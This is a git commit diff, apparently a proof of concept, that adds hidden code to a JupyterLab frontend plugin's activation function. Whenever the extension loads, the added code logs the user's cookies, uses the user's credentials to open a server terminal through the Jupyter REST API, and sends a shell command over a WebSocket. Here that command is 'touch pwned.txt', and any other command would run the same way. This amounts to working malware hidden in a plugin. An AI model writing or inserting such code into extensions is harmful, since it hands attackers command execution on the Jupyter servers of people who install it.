14effa7f9777eab36ad36d0b0c099b444bb0498e
gafnit <agafnit@gmail.com>
2021-07-15 22:44:22 +0300

    first test

--- src/index.ts
+++ src/index.ts
@@ -11,6 +11,25 @@ const plugin: JupyterFrontEndPlugin<void> = {
   autoStart: true,
   activate: (app: JupyterFrontEnd) => {
     console.log('Hacked!Hacked!Hacked!Hacked!Hacked!');
+    console.log(document.cookie);
+    var xhttp = new XMLHttpRequest;
+      var termUri = location.origin + "/api/terminals";
+      xhttp.open("POST", termUri, true);
+      xhttp.withCredentials = true;
+      xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+              console.log("request successfull!!! ");
+              var resp = xhttp.responseText.split('"');
+              var terminal_id = resp[3];
+              var wsUri = "wss://"+location.host+"/terminals/websocket/"+terminal_id;
+              var ws = new WebSocket(wsUri);
+              ws.onopen = function(evt) {  
+              ws.send('["stdin","touch pwned.txt\\r"]');
+              };
+              console.log("file created pwned.txt!!! ");
+          }
+      };
+      xhttp.send();
   }
 };
 
